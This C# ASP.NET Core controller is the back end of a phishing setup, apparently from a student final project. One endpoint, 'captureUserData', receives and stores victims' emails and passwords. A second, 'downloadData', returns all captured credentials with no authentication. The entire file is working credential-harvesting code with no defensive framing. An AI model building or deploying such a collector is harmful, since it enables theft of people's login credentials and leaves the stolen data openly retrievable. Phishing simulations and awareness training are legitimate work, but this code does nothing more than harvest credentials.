using Business.Contract;
using Domain;
using Microsoft.AspNetCore.Mvc;
using Model;

namespace SSProyectoFinal.Controller;

[ApiController]
[Route("api/[controller]")]
public class PhishUserController(IPhishUserService phishUserService) : ControllerBase
{
    [HttpPost("captureUserData")]
    public async Task<ActionResult> Create([FromBody] CreatePhishUserModel entity)
    {
        PhishUser CapturedUserd = new PhishUser();
        CapturedUserd.Email = entity.Email;
        CapturedUserd.Password = entity.Password;
        int userId = phishUserService.Create(CapturedUserd);
        return Ok(userId);
    }
    [HttpGet("downloadData")]
    public async Task<ActionResult> GetCapturedData()
    {
        List<PhishUser> data = phishUserService.GetAllCapturedUsers();
        return Ok(data);
    }
}